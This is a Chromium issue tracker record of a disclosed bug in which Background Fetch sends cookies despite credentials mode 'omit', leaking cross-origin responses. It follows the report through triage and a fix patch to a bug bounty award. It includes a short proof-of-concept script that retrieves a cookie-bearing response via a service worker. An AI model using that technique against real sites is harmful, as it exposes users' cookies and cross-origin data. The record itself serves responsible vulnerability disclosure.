# Security: Bypass of Issue 1239709: Cross-Origin Response Leak If wildcard ACAO is sent

| Field | Value |
|-------|-------|
| **Issue ID** | [40058068](https://issues.chromium.org/issues/40058068) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>BackgroundFetch |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | la...@gmail.com |
| **Assignee** | be...@google.com |
| **Created** | 2021-11-29 |
| **Bounty** | $4,000.00 |

## Description

**VULNERABILITY DETAILS**  

BackgroundFetch sends cookies even if the credentials mode is "omit" or "same-origin" and thus bypassing the fix for <https://crbug.com/chromium/1239709>.

**VERSION**  

Version 96.0.4664.45 (Official Build) Arch Linux (64-bit)

**REPRODUCTION CASE**  

Using the glitch.me site from <https://crbug.com/chromium/1239709>:

- Set a cookie at <https://echo-cookie-test.glitch.me>

```
<script>  
  const url = "https://echo-cookie-test.glitch.me/echo-cookie"; // some site with a wildcard ACAO header  
  
  navigator.serviceWorker.ready.then(async (swReg) => {  
    // { credentials: "same-origin" || "omit" } still sends cookies, but isn't blocked  
    const bgFetch = await swReg.backgroundFetch.fetch("test", [new Request(url, { credentials: "omit" })]);  
  
    const targetPage = await bgFetch.match(url);  
    const response = await targetPage.responseReady;  
  
    console.log(await response.text()); // response contains cookie  
  });  
  
  navigator.serviceWorker.register("sw.js");  
</script>  

```
```
// can be empty  

```

I'm not entirely sure, but AFAIU setting the `request->request_initiator`[1](https://source.chromium.org/chromium/chromium/src/+/main:components/download/internal/common/download_utils.cc;l=277;), that is explained here[2](https://source.chromium.org/chromium/chromium/src/+/main:net/url_request/url_request.h;l=328;), in the DownloadParams struct, that is declared here[3](https://source.chromium.org/chromium/chromium/src/+/main:components/background_fetch/background_fetch_delegate_base.cc;l=93;), should fix this.  

Also not sure how that relates to <https://crbug.com/chromium/1268580> and if that fixes it too.

**CREDIT INFORMATION**  

Reporter credit: Maurice Dauer

## Attachments

- [patch.diff](attachments/patch.diff) (text/x-diff, 2.2 KB)

## Timeline

### [Deleted User] (2021-11-29)

[Empty comment from Monorail migration]

### rs...@chromium.org (2021-11-29)

[Empty comment from Monorail migration]

[Monorail components: Blink>BackgroundFetch]

### [Deleted User] (2021-11-29)

[Empty comment from Monorail migration]

### la...@gmail.com (2021-11-30)

Just noticed that I accidentally put "Size" in the title, but it really should only be "...Cross-Origin Response Leak...". Would be cool if it gets changed for https://crbug.com/chromium/1239709 too before it gets disclosed. Thanks :)

### rs...@chromium.org (2021-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-30)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-13)

rayankans: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-12-23)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-03)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-13)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-24)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-07)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-17)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-28)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### do...@chromium.org (2022-04-27)

Security sheriff ping: rayankans, can you please take a look at this ASAP?

### xi...@chromium.org (2022-04-27)

[Empty comment from Monorail migration]

### ra...@chromium.org (2022-05-04)

Assigning to xingliu@ for triage.

Background Fetch sends the credentials mode (crbug.com/1239709) to the Download Service. The isolation info is also passed along (crbug.com/1244289). Seems like something that needs to be patched from the Downloads side?

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### la...@gmail.com (2022-06-04)

FYI I made a longer comment at https://bugs.chromium.org/p/chromium/issues/detail?id=1320432#c13 about what might be causing some bugs around background fetch including this issue.

### [Deleted User] (2022-07-05)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-15)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-08-03)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-28)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### nh...@google.com (2022-12-06)

[Empty comment from Monorail migration]

### df...@google.com (2022-12-07)

[Empty comment from Monorail migration]

### ko...@google.com (2023-01-26)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-08)

[Empty comment from Monorail migration]

### jo...@google.com (2023-03-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2023-03-09)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-05)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-31)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-16)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-11)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-10)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-11)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-11)

This issue was migrated from crbug.com/chromium/1274547?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-10-26)

xingliu: Uh oh! This issue still open and hasn't been updated in the last 905 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2024-11-10)

xingliu: Uh oh! This issue still open and hasn't been updated in the last 920 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ar...@chromium.org (2024-12-13)

**Secondary security shepherd**

[xingliu@chromium.org](mailto:xingliu@chromium.org). Could you please take a look? See [comment #21](https://issues.chromium.org/issues/40058068#comment21) from two years ago.

### la...@gmail.com (2024-12-16)

fwiw, I think xingliu@ mentioned some time ago in another bug that they aren't actively working on chromium anymore.

### ar...@chromium.org (2024-12-16)

> fwiw, I think xingliu@ mentioned some time ago in another bug that they aren't actively working on chromium anymore.

Thanks! I will ask him on chat who should own this vulnerability.

### ar...@google.com (2024-12-16)

xingliu@ told me qinmin@ would be the right owner to triage.

### qi...@google.com (2024-12-16)

My knowledge on background fetch is limited, but I guess this bug is  already fixed here: https://source.chromium.org/chromium/chromium/src/+/main:content/browser/background_fetch/background_fetch_delegate_proxy.cc;l=193;?
An origin header is added to the request, which should work?

+beveloo@ to confirm.

### be...@google.com (2024-12-18)

Reading this issue, I actually think that it's describing a slightly different issue - when `credentials` are set to `omit`, cookies are still included. Background Fetch then calls into `BackgroundDownloadService::StartDownload`, where it seems to be handled correctly - including the proto conversions. I see that the service is now supported on iOS as well, have there been further changes?

### la...@gmail.com (2025-02-08)

Yes, cookies are still included when `credentials` is set to `omit` and thus also bypassing the [`BackgroundFetchCrossOriginFilter`](https://source.chromium.org/chromium/chromium/src/+/main:content/browser/background_fetch/background_fetch_cross_origin_filter.cc;drc=770f3fce3719ee18c102ad0b1a347d82147fbb1a;l=55). It's been a while and I don't have much time at the moment, but what about the initially suggested fix to pass the `request->request_initiator` to the download service? Similar to how isolation info was passed to the download service in the [patch for issue 40057062](https://chromium-review.googlesource.com/c/chromium/src/+/3194254).

### la...@gmail.com (2025-03-18)

friendly ping

### la...@gmail.com (2025-04-01)

Is there any update on this?

### la...@gmail.com (2025-04-06)

peter@ I have attached a patch that fixes the issue, could you take a look please? Thanks!

### la...@gmail.com (2025-04-16)

anyone able to take a look at the patch? qinmin@ since you also landed the fix for [issue 40057869](https://issues.chromium.org/issues/40057869)?

### qi...@google.com (2025-04-16)

I think peter@ is a better reviewer than me for background fetch. Can you upload a chromium CL and add peter to reviewer?

### la...@gmail.com (2025-04-16)

Uploaded the patch here: <https://chromium-review.googlesource.com/c/chromium/src/+/6464959>

### dx...@google.com (2025-04-22)

Project: chromium/src  

Branch: main  

Author: Maurice Dauer [layton.cscg@gmail.com](mailto:layton.cscg@gmail.com)  

Link:      <https://chromium-review.googlesource.com/6464959>

[Background fetch] Pass request initiator to download service

---


Expand for full commit details
```
     
    The request initiator is required to perform certain security checks, 
    see |request_initiator| in url_request.mojom for details. Since 
    background fetch doesn't work like a normal download, we need to pass it 
    to the download service. 
     
    R=peter@chromium.org 
     
    Bug: 40058068 
    Change-Id: I680e759afda3c582d38c05fb98e322065c43f124 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6464959 
    Reviewed-by: Min Qin <qinmin@chromium.org> 
    Commit-Queue: Peter Beverloo <peter@chromium.org> 
    Reviewed-by: Peter Beverloo <peter@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1449821}

```

---

Files:

- M `AUTHORS`
- M `components/background_fetch/background_fetch_delegate_base.cc`
- M `components/download/content/internal/download_driver_impl.cc`
- M `components/download/public/background_service/download_params.h`

---

Hash: 43cac9d509983c7f68a5ffa119cc7509bde375ea  

Date:  Tue Apr 22 09:49:18 2025


---

### la...@gmail.com (2025-04-23)

I think the issue can be marked as fixed now.

Besides fixing this issue, passing the request initiator also causes background fetch to send the correct `Origin` and `Sec-Fetch-Site` headers.

### pe...@chromium.org (2025-04-25)

(locked out my other account, lol)

Marking this as fixed based on #74. Many thanks for your contribution!!

### ch...@google.com (2025-04-30)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M136. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M137. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [136, 137].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### la...@gmail.com (2025-04-30)

deleted

### am...@chromium.org (2025-04-30)

Thank for the attempt here, but the merge questionnaire needs to be responded to by the person Chromium committer who is responsible for the backmerge.

### am...@chromium.org (2025-04-30)

Removing merge request for M136, M136 is already shipping to Stable.

### am...@chromium.org (2025-05-01)

removing merge label for 137 as this was landed on 137

### sp...@google.com (2025-05-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $4000.00 for this report.

Rationale for this decision:
$2,000 for report of information disclosure + $2,000 patch bonus 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2025-08-02)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058068)*
